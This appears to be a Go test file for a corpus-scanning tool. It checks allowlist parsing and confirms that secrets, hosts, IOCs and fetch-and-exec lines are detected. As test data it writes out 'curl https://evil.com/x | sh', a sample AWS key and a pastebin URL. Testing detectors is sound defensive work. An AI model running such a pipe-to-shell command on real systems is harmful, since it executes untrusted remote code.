package corpus

import (
	"bytes"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestAllowlistNeverSecretOrFetch(t *testing.T) {
	t.Parallel()
	for _, kind := range []string{KindSecret, KindFetch} {
		_, err := ParseAllowlist([]byte("rules/x.test/positivos/a.txtar\t" + kind + "\tdetail\trule-dependent\n"))
		if err == nil || !strings.Contains(err.Error(), "can never be allowlisted") {
			t.Errorf("%s entry: err = %v, want a never-allowlisted error", kind, err)
		}
	}
}

func TestAllowlistRejects(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		"exec bit":        "rules/a.txtar\texec\t-rwxr-xr-x\tr\n",
		"config path":     "rules/a.txtar\tconfig-path\trules/a.txtar\tr\n",
		"symlink":         "rules/a.txtar\tsymlink\tsymlink\tr\n",
		"unknown check":   "rules/a.txtar\tnope\tx\tr\n",
		"three fields":    "rules/a.txtar\thost\tx\n",
		"empty reason":    "rules/a.txtar\thost\tx\t\n",
		"padded field":    "rules/a.txtar\thost\t x\tr\n",
		"whole rules dir": "rules/\thost\tx\tr\n",
		"glob":            "rules/*.test/a.txtar\thost\tx\tr\n",
		"absolute":        "/rules/a.txtar\thost\tx\tr\n",
		"parent":          "../rules/a.txtar\thost\tx\tr\n",
		"unclean":         "rules/./a.txtar\thost\tx\tr\n",
		"duplicate":       "rules/a.txtar\thost\tx\tr\nrules/a.txtar\thost\tx\tother\n",
	}
	for name, in := range cases {
		if _, err := ParseAllowlist([]byte(in)); err == nil {
			t.Errorf("%s: accepted %q", name, in)
		}
	}
	a, err := ParseAllowlist([]byte("# comment\n\nrules/a.txtar\thost\tx.com\tcosmetic, see #43 item 116\n"))
	if err != nil || len(a.Entries) != 1 || a.Entries[0].Line != 3 || a.Entries[0].Reason != "cosmetic, see #43 item 116" {
		t.Fatalf("valid allowlist: %#v, %v", a, err)
	}
}

func TestAllowlistGoldenSize(t *testing.T) {
	t.Parallel()
	a, err := ParseAllowlist([]byte("internal/adapters/claude/testdata/discover.golden\tsize\t21792 bytes\tgolden size\n"))
	if err != nil || len(a.Entries) != 1 || a.Entries[0].Reason != "golden size" {
		t.Fatalf(".golden path: %#v, %v", a, err)
	}
	_, err = ParseAllowlist([]byte("rules/TC-CFG-001.test/positivos/cursor-nested-bash-c.txtar\tsize\t39593 bytes\tgolden size\n"))
	if err == nil || !strings.Contains(err.Error(), `reason "golden size" is only for a path ending in .golden`) {
		t.Fatalf("other path: err = %v", err)
	}
}

func TestAllowlistApply(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	root := filepath.Join(base, "rules")
	a, err := ParseAllowlist([]byte(strings.Join([]string{
		"rules/a.txtar\thost\tgithub.com\trule-dependent",
		"rules/a.txtar\tshebang\trun.sh\tcosmetic, see #43 item 116",
		"rules/gone.txtar\thost\tgithub.com\trule-dependent",
	}, "\n")))
	if err != nil {
		t.Fatal(err)
	}
	findings := []Finding{
		{Root: root, Path: "a.txtar", Kind: KindHost, Detail: "github.com"},
		{Root: root, Path: "a.txtar", Kind: KindShebang, Detail: "run.sh"},
		{Root: root, Path: "a.txtar", Kind: KindHost, Detail: "gitlab.com"},
		{Root: root, Path: "b.txtar", Kind: KindHost, Detail: "github.com"},
		{Root: root, Path: "a.txtar", Kind: KindSecret, Detail: "github.com"},
	}
	unlisted, stale, err := a.Apply(base, findings)
	if err != nil {
		t.Fatal(err)
	}
	if len(unlisted) != 3 || unlisted[0].Detail != "gitlab.com" || unlisted[1].Path != "b.txtar" || unlisted[2].Kind != KindSecret {
		t.Errorf("unlisted %#v", unlisted)
	}
	if len(stale) != 1 || stale[0].Path != "rules/gone.txtar" || stale[0].Line != 3 {
		t.Errorf("stale %#v", stale)
	}
}

func TestPackDefs(t *testing.T) {
	t.Parallel()
	defs := []string{"TC-CFG-015.yaml", "README.md", "ADVISORIES.json", "REGISTRY", "pack.yaml", "embed.go", "TC-CFG-015.test/README.md", "x.test"}
	content := []string{"TC-CFG-015.test/positivos/a.txtar", "TC-CFG-015.test/expect.yaml", "TC-CFG-003.test/negativos/m.json"}
	for _, rel := range defs {
		if !PackDefs(rel) {
			t.Errorf("PackDefs(%q) = false", rel)
		}
	}
	for _, rel := range content {
		if PackDefs(rel) {
			t.Errorf("PackDefs(%q) = true", rel)
		}
	}
}

// TestDefsScope keeps rule definitions out of the host, IOC, and
// entropy checks only: a secret or a fetch-and-exec line in a rule file
// is still a finding, and fixture content gets every check.
func TestDefsScope(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	token := "Zq8vT3kLm9Xw2Rb7Yn4Hc6Jd1Fg5Sa0Pe8Uo3Iy7Tr2Ew9Qa"
	text := "see https://pastebin.com/raw/x and " + token + "\n"
	writeFile(t, filepath.Join(dir, "TC-X.yaml"), []byte(text+"key: AKIAIOSFODNN7EXAMPLE\nrun: curl https://evil.com/x | sh\n"), 0o644)
	writeFile(t, filepath.Join(dir, "TC-X.test", "positivos", "a.txtar"), []byte("-- notes.txt --\n"+text), 0o644)
	got, err := CheckRoots(Root{Dir: dir, Defs: PackDefs})
	if err != nil {
		t.Fatal(err)
	}
	kinds := map[string][]string{}
	for _, f := range got {
		kinds[f.Path] = append(kinds[f.Path], f.Kind)
	}
	for p := range kinds {
		slices.Sort(kinds[p])
	}
	if want := []string{KindFetch, KindSecret}; !slices.Equal(kinds["TC-X.yaml"], want) {
		t.Errorf("rule file kinds %v, want %v", kinds["TC-X.yaml"], want)
	}
	if want := []string{KindEntropy, KindHost, KindIOC}; !slices.Equal(kinds["TC-X.test/positivos/a.txtar"], want) {
		t.Errorf("fixture kinds %v, want %v", kinds["TC-X.test/positivos/a.txtar"], want)
	}
}

// TestSizeStillScansContent keeps an oversized file's content checked:
// allowlisting its size must not hide a host or a secret in it.
func TestSizeStillScansContent(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	data := append(bytes.Repeat([]byte("a\n"), maxFileBytes), []byte("https://github.com/x\n")...)
	writeFile(t, filepath.Join(dir, "big.txtar"), data, 0o644)
	assertKinds(t, dir, KindHost, KindSize)
}
